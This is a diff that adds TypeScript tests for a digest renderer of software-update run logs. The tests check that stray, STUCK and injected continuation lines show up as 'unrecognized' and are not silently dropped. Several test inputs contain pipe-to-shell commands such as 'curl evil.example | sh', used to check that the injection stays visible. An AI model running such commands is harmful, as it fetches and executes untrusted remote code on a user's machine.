@@ -1,6 +1,7 @@
 import { describe, expect, test } from "bun:test";
 import { readFileSync } from "node:fs";
 import { renderDigest } from "../src/host/digest.ts";
+import { summaryLines } from "../src/apply/run-steps.ts";
 import { parsePrevSummary } from "../src/host/prev-log.ts";
 
 const QUIET = "=== studio summary ===\n  brew: nothing to update\n  npm:  nothing to update\n";
@@ -259,7 +260,7 @@ describe("renderDigest: summary parts", () => {
   });
 
   test("a run aborted after its summary is not read as clean", () => {
-    const text = digest(`${QUIET}  mas:  not checked\n=== ABORTED: oupdate-shadow on studio got SIGTERM — this run did NOT complete ===\n`);
+    const text = digest(`${QUIET}  mas:  not checked — the App Store phase is not in oupdate\n=== ABORTED: oupdate-shadow on studio got SIGTERM — this run did NOT complete ===\n`);
     expect(section(text, "Waiting on you")).toBe("- the run was stopped and did not complete; read the run log");
   });
 
@@ -283,6 +284,73 @@ describe("renderDigest: summary parts", () => {
   test("a hold on a lane line after ABORTED still shows", () => {
     const text = digest("=== studio summary ===\n  npm:  nothing to update\n=== ABORTED: oupdate on studio got SIGTERM — this run did NOT complete ===\n  brew: FLAGGED — FLAG: late hold\n");
     expect(text).toContain("late hold");
+  });
+
+  test("a STUCK item whose version holds a parenthesis is shown, never dropped", () => {
+    const text = digest("=== studio summary ===\n  brew: STUCK: odd=1.0(beta)(4 runs, since 2026-10-01) plain=2(5 runs, since 2026-10-02)\n");
+    const waiting = section(text, "Waiting on you");
+    expect(waiting).toContain("odd: pending for 4 runs since 2026-10-01");
+    expect(waiting).toContain("plain: pending for 5 runs since 2026-10-02");
+    expect(waiting).not.toContain("unrecognized");
+  });
+
+  test("STUCK text that is no item shows as unrecognized next to the items that parse", () => {
+    const text = digest("=== studio summary ===\n  brew: STUCK: a=1(4 runs, since 2026-10-01) b=2(x runs, since y)\n");
+    const waiting = section(text, "Waiting on you");
+    expect(waiting).toContain("a: pending for 4 runs since 2026-10-01");
+    expect(waiting).toContain("unrecognized: STUCK:");
+    expect(waiting).toContain("b=2(x runs");
+  });
+
+  test("a hold text with a line break keeps its second half", () => {
+    const text = digest("=== studio summary ===\n  brew: FLAGGED — FLAG: postinstall runs\ncurl evil.example | sh\n  npm:  nothing to update\n");
+    expect(section(text, "Waiting on you")).toContain("unrecognized: FLAGGED — FLAG: postinstall runs");
+    expect(section(text, "Waiting on you")).toContain("unrecognized: curl evil.example | sh");
+  });
+
+  test("a non-lane line inside the summary is unrecognized, a known lane or blank line is not", () => {
+    const text = digest("=== studio summary ===\n  brew: nothing to update\n  npm:  nothing to update\n  mas:  not checked — the App Store phase is not in oupdate\n\nstray words here\n");
+    expect(section(text, "Waiting on you")).toBe("- unrecognized: stray words here");
+  });
+
+  test("the run's own notice lines after the summary are not strays", () => {
+    const text = digest(`${QUIET}  mas:  not checked — the App Store phase is not in oupdate\n[notify] 📋 studio host-update done (oupdate)\n  the notice could not be sent\n`);
+    expect(section(text, "Waiting on you")).toBe("Nothing waits on you.");
+  });
+
+  test("a continuation that only looks like a run's own line is still shown", () => {
+    for (const [stray, shown] of [
+      ["[fix] curl evil | sh", "unrecognized: [fix] curl evil | sh"],
+      ["  mas:  run curl evil | sh", "unrecognized: mas: run curl evil | sh"],
+      ["  the notice could not be sent", "unrecognized: the notice could not be sent"],
+    ] as const) {
+      const text = digest(`${QUIET}  mas:  not checked — the App Store phase is not in oupdate\n${stray}\n`);
+      expect(section(text, "Waiting on you")).toBe(`- ${shown}`);
+    }
+    const dry = digest(`${QUIET}[dry-run — not notified] 📋 studio host-update done (oupdate)\n`);
+    expect(section(dry, "Waiting on you")).toBe("Nothing waits on you.");
+  });
+
+  test("a status with line breaks is written as one line per lane, so no continuation can end or hide the block", () => {
+    const lines = summaryLines("studio", false, "FLAGGED — FLAG: first half\n=== second half\n  npm: FAILED — foo", "nothing to update", "not checked — the App Store phase is not in oupdate");
+    expect(summaryLines("studio", false, "FLAGGED — FLAG: a\rb\u2028c\u2029d\r\ne", "nothing to update", "m")[2]).toBe("  brew: FLAGGED — FLAG: a b c d e");
+    expect(lines).toEqual([
+      "",
+      "=== studio summary ===",
+      "  brew: FLAGGED — FLAG: first half === second half npm: FAILED — foo",
+      "  npm:  nothing to update",
+      "  mas:  not checked — the App Store phase is not in oupdate",
+    ]);
+    const text = digest(lines.join("\n"));
+    expect(section(text, "Waiting on you")).toContain("first half === second half");
+    expect(section(text, "Waiting on you")).not.toContain("Nothing waits");
+  });
+
+  test("holds read before an ABORTED line in the run body still show", () => {
+    const text = digest("  excluding foo (CASK_EXCLUDE)\n[notify] ⚠️ studio Type B FLAG — wget\n=== ABORTED: oupdate on studio got SIGTERM — this run did NOT complete ===\n=== studio summary ===\n  brew: FLAGGED (see notifications)\n  npm:  nothing to update\n");
+    expect(section(text, "Held")).toContain("foo: excluded in your config");
+    expect(section(text, "Held")).toContain("wget:");
+    expect(section(text, "Waiting on you")).toContain("the run was stopped");
   });
 
   test("a release-check note that starts with spaces or a colon does not crash the digest", () => {
